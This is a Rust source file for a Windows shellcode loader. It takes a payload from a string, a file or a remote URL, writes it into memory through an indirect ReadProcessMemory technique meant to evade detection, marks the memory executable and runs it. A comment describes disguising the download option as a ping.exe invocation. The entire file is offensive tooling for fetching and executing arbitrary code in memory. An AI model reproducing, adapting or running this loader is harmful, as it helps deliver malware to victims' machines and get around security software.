use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::memoryapi::VirtualProtect;
use winapi::um::memoryapi::ReadProcessMemory;
use winapi::um::processthreadsapi::GetCurrentProcess;
use winapi::um::winnt::HANDLE;

use clap::Parser;

use std::fs;
use std::mem;
use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

// COMPILE TO X32
// rustup target add i686-pc-windows-msvc
// cargo build --target i686-pc-windows-msvc --release

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args
{
    #[clap(short, long="string_inyect")]
    string_inyect: Option<String>,

    #[clap(short, long="file_path")]
    file_path: Option<String>,

    // Done with the name of target_payload to be the option -t this aims the impersonation of ping.exe -t http[:]//somewhere.com
    #[clap(short, long="remote_payload")]
    target_payload: Option<String>,

    #[clap(short, long="verbose", action)]
    vverbose: bool,

    #[clap(short, long="execute", action)]
    execute_payload: bool
}

/// @description: Converts a string to windows wide_null
fn to_wide_null(s: &str) -> Vec<u16> {
    let mut v: Vec<u16> = OsStr::new(s).encode_wide().collect();
    v.push(0);
    v
}

fn download_payload (url: String, verbose: bool) -> Vec<u16>
{
    let response = reqwest::blocking::get(url).unwrap();
    let content = response.bytes().unwrap();
    let content_vec = content.to_vec();

    verbose_handler(verbose, format!("Total bytes downloaded: {:?}", content.len()).as_str(), "success");

    // Cast to Vec<u16>

    let result = content_vec.
                    chunks_exact(2)
                    .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
                    .collect();

    result
}

fn verbose_handler (verbose: bool, string_to_print: &str, msg_type: &str)
{
    if verbose
    {
        match msg_type
        {
            "info" => println!("[i] {:}", string_to_print),
            "warning" => println!("[!] {:}", string_to_print),
            "success" => println!("[+] {:}", string_to_print),
            "error" => println!("[-] {:}", string_to_print),
            _ =>  println!("[*] {:}", string_to_print)
        }
    }
}

fn indirect_memory_allocation (inyect_string: Vec<u16>, execute_payload: bool, verbose: bool)
{
    let dummy_buffer_size = inyect_string.len();
    let mut dummy_buffer: Vec<u8> = vec![0u8, dummy_buffer_size as u8];

    // Cast u16 to bytes size
    let inyect_string_size = inyect_string.len() * mem::size_of::<u16>();

    unsafe
    {
        let memory_alloc = VirtualAlloc(
            std::ptr::null_mut(),
            inyect_string_size,
            winapi::um::winnt::MEM_COMMIT | winapi::um::winnt::MEM_RESERVE,
            winapi::um::winnt::PAGE_READWRITE);

        verbose_handler(verbose, format!("Memory offset reserved (hex): 0x{:X}", memory_alloc as usize).as_str(), "info");
        // verbose_handler(verbose, format!().as_str(), "info");

        // if not null memory allocated
        if !memory_alloc.is_null()
        {
            verbose_handler(verbose, "Memory allocated", "success");

            // Now try to indirect write
            let current_process: HANDLE = GetCurrentProcess();

            // Convert the string as bytes
            let string_bytes: *const u8 = inyect_string.as_ptr() as *const u8;

            verbose_handler(verbose, "Writting...", "info");

            // Insert byte by byte of the string
            for i in 0..inyect_string_size
            {
                // Add to the real pointer to impersonate
                let des_offset_pointer = (memory_alloc as *mut u8).add(i) as *mut usize;
                let nsize = *string_bytes.add(i) as usize;

                let _read_process_mem_result = ReadProcessMemory(
                    current_process,
                    memory_alloc,
                    dummy_buffer.as_mut_ptr() as _,
                    nsize,
                    des_offset_pointer);
            }

            // Check for execution
            if execute_payload
            {
                let mut old_protect: winapi::shared::minwindef::DWORD = 0;

                // Change the permissions of the region
                let perm_change_result = VirtualProtect(
                    memory_alloc,
                    inyect_string_size,
                    winapi::um::winnt::PAGE_EXECUTE_READWRITE,
                    &mut old_protect as *mut winapi::shared::minwindef::DWORD);

                if perm_change_result != 0
                {
                    verbose_handler(verbose, "Permisions of the memory changed!", "info");
                }

                verbose_handler(verbose, "Executing the shellcode...", "");

                // Make the region executable and run x64 bits (for x32 is diferent)
                let shellcode_function: extern "system" fn() -> () = std::mem::transmute(memory_alloc);

                // Run the shellcode
                shellcode_function();
            }

            verbose_handler(verbose, "Data should be copied on memory indirecly with ReadProcessMemory", "success");
        }
        else
        {
            verbose_handler(verbose, "Memory allocation failed", "error");
        }
    }
}

fn main()
{
    // Parse the arguments
    let args = Args::parse();

    let converted_inyection = Some(args.string_inyect).unwrap_or_default().unwrap_or_default();
    let converted_remote = Some(args.target_payload).unwrap_or_default().unwrap_or_default();
    let converted_filepath = Some(args.file_path).unwrap_or_default().unwrap_or_default();

    if converted_inyection == "" && converted_filepath == "" && converted_remote == ""
    {
        verbose_handler(true, "Error no config provided (--help)", "error");
        return;
    }

    if converted_inyection == "" && converted_remote == ""
    {
        if converted_filepath == ""
        {
            verbose_handler(args.vverbose, "ERROR no file path provided (--help)", "error");
            return;
        }

        verbose_handler(args.vverbose, format!("Reading file: {}", converted_filepath).as_str(), "info");

        // let file_content = fs::read_to_string(converted_filepath.clone()).unwrap_or_default();
        let file_content = fs::read(converted_filepath.clone()).expect("[-] Error reading the file");

        if file_content.len() > 0
        {
            // // Move the content to the memory
            let casted_file_content: Vec<u16> = file_content
                                    .chunks_exact(2)
                                    .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
                                    .collect();

            indirect_memory_allocation(casted_file_content,  args.execute_payload, args.vverbose);
        }
        else
        {
            verbose_handler(args.vverbose, format!("Error reading content of file: {}", converted_filepath).as_str(), "error");
        }

        // indirect_memory_allocation(payload_content, args.debug, args.execute_payload);

        // std::thread::sleep(std::time::Duration::from_millis(1000000));
    }
    else if converted_remote != ""
    {
        // Remote download the payload
        let payload_content = download_payload(converted_remote, args.vverbose);

        // Indirect and execute
        indirect_memory_allocation(payload_content, args.execute_payload, args.vverbose);
    }
    else
    {
        // Default mode
        let inyect_string = to_wide_null(converted_inyection.as_str());

        // Cast u16 to bytes size
        let inyect_string_size = inyect_string.len() * mem::size_of::<u16>();

        verbose_handler(args.vverbose, format!("Total bytes to copy: {}", inyect_string_size).as_str(), "info");

        indirect_memory_allocation(inyect_string, args.execute_payload, args.vverbose);
    }

}